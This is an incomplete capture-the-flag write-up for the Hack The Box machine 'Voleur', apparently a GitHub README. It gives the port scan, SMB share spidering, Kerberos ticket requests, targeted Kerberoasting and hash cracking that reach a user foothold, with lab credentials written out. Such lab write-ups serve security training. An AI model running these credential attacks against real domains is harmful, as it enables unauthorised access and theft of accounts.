<img width="1400" height="1138" alt="Voleur" src="https://github.com/user-attachments/assets/980f8849-8b41-492e-b42f-b181f3befeba" />


host : voleur.htb dc.voleur.htb

#Recon


        PORT      STATE SERVICE       REASON          VERSION
        53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
        88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-12 23:13:38Z)
        135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
        139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
        389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
        445/tcp   open  microsoft-ds? syn-ack ttl 127
        464/tcp   open  kpasswd5?     syn-ack ttl 127
        593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
        636/tcp   open  tcpwrapped    syn-ack ttl 127
        2222/tcp  open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)


#exploitation-chain


All first tries on these ports and the given credentials won't work so we going to  analyze  using other method
	  
       nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -M spider_plus -k


#Note: the right domain voleur.htb doesn't responde to any of our queries that's why we gonna use the dc now with spider_plus option

if you want more details about the tool itself , check out the following link : 
	  https://linuxcommandlibrary.com/man/nxc

<img width="1477" height="697" alt="1" src="https://github.com/user-attachments/assets/a29e5b59-2718-4749-8104-99f79c65cb36" />



From that view , we noticed , IT share is readable 



      impacket-getTGT voleur.htb/ryan.naylor:'HollowOct31Nyt' -dc-ip 10.10.11.76
      export KRB5CCNAME=ryan.naylor.ccache
      impacket-smbclient -k dc.voleur.htb
      
  
  
<img width="853" height="402" alt="3" src="https://github.com/user-attachments/assets/cd4e5bec-a3c5-48dd-b6e8-07853d5d955b" />

get the .xlsx file , crack it and get access to its content 


<img width="1920" height="1045" alt="4" src="https://github.com/user-attachments/assets/a14d2de2-ef9d-4185-b578-864cdae49d2b" />

#So we get svc_ldap ticket and perform a targetkerberoasting attack 


    impacket-getTGT voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn' -dc-ip 10.10.11.76
    export KRB5CCNAME=svc_ldap.ccache
    python3 targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb

#The script output included hashes for lacey.miller and svc_winrm . The svc_winrm hash was
saved and cracked using John the Ripper:

      > john --wordlist=/usr/share/wordlists/rockyou.txt svc_winrm_hashes.txt  :  User : svc_winrm , Pass ==> AFireInsidedeOzarctica980219afi (?)

#user foothold 
<img width="1920" height="1045" alt="5" src="https://github.com/user-attachments/assets/8b7ae6c8-8e06-4e65-bc11-899e4fda1899" />

#Note : As the machine still not retired , we'll stop here for today stuffs ; update will come soon 

<img width="701" height="635" alt="Screenshot 2025-07-12 at 20-31-35 Hack The Box Hack The Box" src="https://github.com/user-attachments/assets/d8b684b7-8c4b-442c-a5de-1b87f94f287a" />


